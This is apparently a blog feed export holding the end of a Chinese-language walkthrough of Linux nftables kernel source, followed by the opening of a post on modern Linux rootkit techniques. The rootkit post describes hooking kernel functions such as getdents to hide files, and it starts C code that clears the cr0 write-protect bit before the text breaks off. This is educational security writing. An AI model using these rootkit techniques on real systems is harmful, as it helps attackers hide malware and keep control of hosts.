class="built_in">memset</span>(&amp;desc, <span class="number">0</span>, <span class="keyword">sizeof</span>(desc));</span><br><span class="line"></span><br><span class="line">ktype = NFT_DATA_VALUE;</span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_KEY_TYPE] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">ktype = ntohl(nla_get_be32(nla[NFTA_SET_KEY_TYPE]));</span><br><span class="line"><span class="keyword">if</span> ((ktype &amp; NFT_DATA_RESERVED_MASK) == NFT_DATA_RESERVED_MASK)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">desc.klen = ntohl(nla_get_be32(nla[NFTA_SET_KEY_LEN]));</span><br><span class="line"><span class="keyword">if</span> (desc.klen == <span class="number">0</span> || desc.klen &gt; NFT_DATA_VALUE_MAXLEN)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">flags = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_FLAGS] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">flags = ntohl(nla_get_be32(nla[NFTA_SET_FLAGS]));</span><br><span class="line"><span class="keyword">if</span> (flags &amp; ~(NFT_SET_ANONYMOUS | NFT_SET_CONSTANT |</span><br><span class="line">      NFT_SET_INTERVAL | NFT_SET_TIMEOUT |</span><br><span class="line">      NFT_SET_MAP | NFT_SET_EVAL |</span><br><span class="line">      NFT_SET_OBJECT | NFT_SET_CONCAT))</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line"><span class="comment">/* Only one of these operations is supported */</span></span><br><span class="line"><span class="keyword">if</span> ((flags &amp; (NFT_SET_MAP | NFT_SET_OBJECT)) ==</span><br><span class="line">     (NFT_SET_MAP | NFT_SET_OBJECT))</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line"><span class="keyword">if</span> ((flags &amp; (NFT_SET_EVAL | NFT_SET_OBJECT)) ==</span><br><span class="line">     (NFT_SET_EVAL | NFT_SET_OBJECT))</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dtype = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_DATA_TYPE] != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(flags &amp; NFT_SET_MAP))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">dtype = ntohl(nla_get_be32(nla[NFTA_SET_DATA_TYPE]));</span><br><span class="line"><span class="keyword">if</span> ((dtype &amp; NFT_DATA_RESERVED_MASK) == NFT_DATA_RESERVED_MASK &amp;&amp;</span><br><span class="line">    dtype != NFT_DATA_VERDICT)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (dtype != NFT_DATA_VERDICT) &#123;</span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_DATA_LEN] == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">desc.dlen = ntohl(nla_get_be32(nla[NFTA_SET_DATA_LEN]));</span><br><span class="line"><span class="keyword">if</span> (desc.dlen == <span class="number">0</span> || desc.dlen &gt; NFT_DATA_VALUE_MAXLEN)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">desc.dlen = <span class="keyword">sizeof</span>(struct nft_verdict);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (flags &amp; NFT_SET_MAP)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_OBJ_TYPE] != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(flags &amp; NFT_SET_OBJECT))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">objtype = ntohl(nla_get_be32(nla[NFTA_SET_OBJ_TYPE]));</span><br><span class="line"><span class="keyword">if</span> (objtype == NFT_OBJECT_UNSPEC ||</span><br><span class="line">    objtype &gt; NFT_OBJECT_MAX)</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (flags &amp; NFT_SET_OBJECT)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">objtype = NFT_OBJECT_UNSPEC;</span><br><span class="line"></span><br><span class="line">timeout = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_TIMEOUT] != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(flags &amp; NFT_SET_TIMEOUT))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">err = nf_msecs_to_jiffies64(nla[NFTA_SET_TIMEOUT], &amp;timeout);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line">gc_int = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_GC_INTERVAL] != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(flags &amp; NFT_SET_TIMEOUT))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">gc_int = ntohl(nla_get_be32(nla[NFTA_SET_GC_INTERVAL]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">policy = NFT_SET_POL_PERFORMANCE;</span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_POLICY] != <span class="literal">NULL</span>)</span><br><span class="line">policy = ntohl(nla_get_be32(nla[NFTA_SET_POLICY]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_DESC] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">err = nf_tables_set_desc_parse(&amp;desc, nla[NFTA_SET_DESC]);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_EXPR])</span><br><span class="line">desc.expr = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">table = nft_table_lookup(net, nla[NFTA_SET_TABLE], family, genmask);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(table)) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_SET_TABLE]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(table);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nft_ctx_init(&amp;ctx, net, skb, nlh, family, table, <span class="literal">NULL</span>, nla);</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> = nft_set_lookup(table, nla[NFTA_SET_NAME], genmask);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(<span class="built_in">set</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (PTR_ERR(<span class="built_in">set</span>) != -ENOENT) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_SET_NAME]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(<span class="built_in">set</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_flags &amp; NLM_F_EXCL) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_SET_NAME]);</span><br><span class="line"><span class="keyword">return</span> -EEXIST;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_flags &amp; NLM_F_REPLACE)</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(nlh-&gt;nlmsg_flags &amp; NLM_F_CREATE))</span><br><span class="line"><span class="keyword">return</span> -ENOENT;</span><br><span class="line"></span><br><span class="line">ops = nft_select_set_ops(&amp;ctx, nla, &amp;desc, policy);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(ops))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(ops);</span><br><span class="line"></span><br><span class="line">udlen = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_USERDATA])</span><br><span class="line">udlen = nla_len(nla[NFTA_SET_USERDATA]);</span><br><span class="line"></span><br><span class="line">size = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (ops-&gt;privsize != <span class="literal">NULL</span>)</span><br><span class="line">size = ops-&gt;privsize(nla, &amp;desc);</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> = kvzalloc(<span class="keyword">sizeof</span>(*<span class="built_in">set</span>) + size + udlen, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">set</span>)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">name = nla_strdup(nla[NFTA_SET_NAME], GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!name) &#123;</span><br><span class="line">err = -ENOMEM;</span><br><span class="line"><span class="keyword">goto</span> err_set_name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = nf_tables_set_alloc_name(&amp;ctx, <span class="built_in">set</span>, name);</span><br><span class="line">kfree(name);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err_set_alloc_name;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_EXPR]) &#123;</span><br><span class="line">expr = nft_set_elem_expr_alloc(&amp;ctx, <span class="built_in">set</span>, nla[NFTA_SET_EXPR]);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(expr)) &#123;</span><br><span class="line">err = PTR_ERR(expr);</span><br><span class="line"><span class="keyword">goto</span> err_set_alloc_name;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">udata = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (udlen) &#123;</span><br><span class="line">udata = <span class="built_in">set</span>-&gt;data + size;</span><br><span class="line">nla_memcpy(udata, nla[NFTA_SET_USERDATA], udlen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">INIT_LIST_HEAD(&amp;<span class="built_in">set</span>-&gt;bindings);</span><br><span class="line"><span class="built_in">set</span>-&gt;table = table;</span><br><span class="line">write_pnet(&amp;<span class="built_in">set</span>-&gt;net, net);</span><br><span class="line"><span class="built_in">set</span>-&gt;ops   = ops;</span><br><span class="line"><span class="built_in">set</span>-&gt;ktype = ktype;</span><br><span class="line"><span class="built_in">set</span>-&gt;klen  = desc.klen;</span><br><span class="line"><span class="built_in">set</span>-&gt;dtype = dtype;</span><br><span class="line"><span class="built_in">set</span>-&gt;objtype = objtype;</span><br><span class="line"><span class="built_in">set</span>-&gt;dlen  = desc.dlen;</span><br><span class="line"><span class="built_in">set</span>-&gt;expr = expr;</span><br><span class="line"><span class="built_in">set</span>-&gt;flags = flags;</span><br><span class="line"><span class="built_in">set</span>-&gt;size  = desc.size;</span><br><span class="line"><span class="built_in">set</span>-&gt;policy = policy;</span><br><span class="line"><span class="built_in">set</span>-&gt;udlen  = udlen;</span><br><span class="line"><span class="built_in">set</span>-&gt;udata  = udata;</span><br><span class="line"><span class="built_in">set</span>-&gt;timeout = timeout;</span><br><span class="line"><span class="built_in">set</span>-&gt;gc_int = gc_int;</span><br><span class="line"><span class="built_in">set</span>-&gt;handle = nf_tables_alloc_handle(table);</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>-&gt;field_count = desc.field_count;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; desc.field_count; i++)</span><br><span class="line"><span class="built_in">set</span>-&gt;field_len[i] = desc.field_len[i];</span><br><span class="line"></span><br><span class="line">err = ops-&gt;init(<span class="built_in">set</span>, &amp;desc, nla);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err_set_init;</span><br><span class="line"></span><br><span class="line">err = nft_trans_set_add(&amp;ctx, NFT_MSG_NEWSET, <span class="built_in">set</span>);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err_set_trans;</span><br><span class="line"></span><br><span class="line">list_add_tail_rcu(&amp;<span class="built_in">set</span>-&gt;<span class="built_in">list</span>, &amp;table-&gt;sets);</span><br><span class="line">table-&gt;use++;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err_set_trans:</span><br><span class="line">ops-&gt;destroy(<span class="built_in">set</span>);</span><br><span class="line">err_set_init:</span><br><span class="line"><span class="keyword">if</span> (expr)</span><br><span class="line">nft_expr_destroy(&amp;ctx, expr);</span><br><span class="line">err_set_alloc_name:</span><br><span class="line">kfree(<span class="built_in">set</span>-&gt;name);</span><br><span class="line">err_set_name:</span><br><span class="line">kvfree(<span class="built_in">set</span>);</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样的<code>nft_ctx_init</code>在这个函数之前主要做的事情是初始化一些变量并且找到对应的table。</p><p>随后直接通过<code>nft_set_lookup</code>函数找到set，如果已存在set则直接返回，如果未存在则继续。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">const</span> struct nft_set_ops *</span></span><br><span class="line"><span class="function"><span class="title">nft_select_set_ops</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="keyword">const</span> struct nlattr * <span class="keyword">const</span> nla[],</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="keyword">const</span> struct nft_set_desc *desc,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="keyword">enum</span> nft_set_policies policy)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_set_ops</span> *<span class="title">ops</span>, *<span class="title">bops</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set_estimate</span> <span class="title">est</span>, <span class="title">best</span>;</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_set_type</span> *<span class="title">type</span>;</span></span><br><span class="line">u32 flags = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">lockdep_assert_held(&amp;ctx-&gt;net-&gt;nft.commit_mutex);</span><br><span class="line">lockdep_nfnl_nft_mutex_not_held();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_FLAGS] != <span class="literal">NULL</span>)</span><br><span class="line">flags = ntohl(nla_get_be32(nla[NFTA_SET_FLAGS]));</span><br><span class="line"></span><br><span class="line">bops    = <span class="literal">NULL</span>;</span><br><span class="line">best.size   = ~<span class="number">0</span>;</span><br><span class="line">best.lookup = ~<span class="number">0</span>;</span><br><span class="line">best.space  = ~<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ARRAY_SIZE(nft_set_types); i++) &#123;</span><br><span class="line">type = nft_set_types[i];</span><br><span class="line">ops = &amp;type-&gt;ops;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!nft_set_ops_candidate(type, flags))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span> (!ops-&gt;estimate(desc, flags, &amp;est))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (policy) &#123;</span><br><span class="line"><span class="keyword">case</span> NFT_SET_POL_PERFORMANCE:</span><br><span class="line"><span class="keyword">if</span> (est.lookup &lt; best.lookup)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (est.lookup == best.lookup &amp;&amp;</span><br><span class="line">    est.space &lt; best.space)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> NFT_SET_POL_MEMORY:</span><br><span class="line"><span class="keyword">if</span> (!desc-&gt;size) &#123;</span><br><span class="line"><span class="keyword">if</span> (est.space &lt; best.space)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (est.space == best.space &amp;&amp;</span><br><span class="line">    est.lookup &lt; best.lookup)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (est.size &lt; best.size || !bops) &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bops = ops;</span><br><span class="line">best = est;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (bops != <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> bops;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-EOPNOTSUPP);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里首先通过<code>nft_select_set_ops</code>函数来找到ops</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_set_type</span> *<span class="title">nft_set_types</span>[] =</span> &#123;</span><br><span class="line">&amp;nft_set_hash_fast_type,</span><br><span class="line">&amp;nft_set_hash_type,</span><br><span class="line">&amp;nft_set_rhash_type,</span><br><span class="line">&amp;nft_set_bitmap_type,</span><br><span class="line">&amp;nft_set_rbtree_type,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(CONFIG_X86_64) &amp;&amp; !defined(CONFIG_UML)</span></span><br><span class="line">&amp;nft_set_pipapo_avx2_type,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&amp;nft_set_pipapo_type,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>存在以上种类的set type，在这里找到对应的ops之后进行返回最后再初始化set。</p><p>不过这里与前面不同的是，在写入名字的时候如果之前存在的话会直接释放内存并返回错误。</p><h3 id="配置表达式"><a href="#配置表达式" class="headerlink" title="配置表达式"></a>配置表达式</h3><p>表达式在两处内都存在一是在申请规则时，其次就是申请集合时。</p><p>申请规则时好理解在申请到rule之后直接调用<code>nf_tables_newexpr</code>函数进行初始化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nf_tables_newexpr</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> struct nft_expr_info *info,</span></span></span><br><span class="line"><span class="params"><span class="function">     struct nft_expr *expr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_ops</span> *<span class="title">ops</span> =</span> info-&gt;ops;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">expr-&gt;ops = ops;</span><br><span class="line"><span class="keyword">if</span> (ops-&gt;init) &#123;</span><br><span class="line">err = ops-&gt;init(ctx, expr, (<span class="keyword">const</span> struct nlattr **)info-&gt;tb);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">err1:</span><br><span class="line">expr-&gt;ops = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里面对不同类型表达式会进入到不同的init函数中，这里不过多分析了。</p><p>再就是在申请集合时会申请表达式。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_EXPR]) &#123;</span><br><span class="line">    expr = nft_set_elem_expr_alloc(&amp;ctx, <span class="built_in">set</span>, nla[NFTA_SET_EXPR]);</span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(expr)) &#123;</span><br><span class="line">        err = PTR_ERR(expr);</span><br><span class="line">        <span class="keyword">goto</span> err_set_alloc_name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在用户态传入时存在expression则会调用<code>nft_set_elem_expr_alloc</code>进行创建。</p><hr><p>参考链接：</p><p><a class="link"   href="https://wiki.nftables.org/wiki-nftables/index.php/Main_Page" >https://wiki.nftables.org/wiki-nftables/index.php/Main_Page<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://www.cnblogs.com/xinghuo123/p/13797589.html" >https://www.cnblogs.com/xinghuo123/p/13797589.html<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;转眼间上一篇文章又是几个月前的事情了，主要原因是近期遇到了一个让我十分痴迷的游戏——PUBG！建议直接跟我学习我的无敌闪身喷！依稀记得在蓝楼</summary>
      
    
    
    
    <category term="Linux Kernel" scheme="https://196082.github.io/categories/Linux-Kernel/"/>
    
    
    <category term="netfilter" scheme="https://196082.github.io/tags/netfilter/"/>
    
    <category term="nftables" scheme="https://196082.github.io/tags/nftables/"/>
    
    <category term="netlink" scheme="https://196082.github.io/tags/netlink/"/>
    
  </entry>
  
  <entry>
    <title>Linux Rootkit现代技术分析</title>
    <link href="https://196082.github.io/2024/06/03/Linux-Rootkit%E7%8E%B0%E4%BB%A3%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/"/>
    <id>https://196082.github.io/2024/06/03/Linux-Rootkit%E7%8E%B0%E4%BB%A3%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</id>
    <published>2024-06-03T11:39:56.000Z</published>
    <updated>2024-06-03T11:40:38.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于懒狗症发作加上每天沉迷游戏导致很久没有更新文章了，其实上一篇的Rootkit其实都是残缺版但是不想继续写了就直接加了个入门两个字就发出来了😴。这一篇文章主要是在上一篇文章的基础上进行一系列的拓展以及补充，目前看来也是最后一篇关于rootkit的文章。</p><p>已经是玩了几个月了，文章只字未动。懒狗的醒悟！</p><h2 id="函数劫持"><a href="#函数劫持" class="headerlink" title="函数劫持"></a>函数劫持</h2><p>rootkit作为存在于Linux内核态，这也意味着rootkit拥有着超级高的权限，在需要完成一些特定的目的时可以通过修改内核中函数来完成。例如在需要进行文件隐藏时可以通过修改<code>getdents</code>函数来实现。</p><h3 id="修改只读内存"><a href="#修改只读内存" class="headerlink" title="修改只读内存"></a>修改只读内存</h3><p>这里简单分析三种方法来修改内核中只读内存段。</p><p><strong>方法一：修改cr0寄存器</strong></p><p>只读保护的开关其实是由cr0寄存器中的<code>write protect</code>位决定的，所以这里只需要将cr0寄存器的这一位置0即可关闭只读保护，从而改写内存中只读区域的数据。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">rootkit_read_cr0</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> cr0;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;movq  %%cr0, %%rax;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;movq  %%rax, %0;   &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        : <span class="string">&quot;=r&quot;</span>(cr0)::<span class="string">&quot;%rax&quot;</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cr0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rootkit_write_cr0</span><span class="params">(<span class="keyword">size_t</span> cr0)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;movq   %0, %%rax;  &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;movq  %%rax, %%cr0;&quot;</span> ::<span class="string">&quot;r&quot;</span>(cr0) : <span class="string">&quot;%rax&quot;</span>)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rootkit_disable_write_protect</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> cr0_val;</span><br><span class="line"></span><br><span class="line">   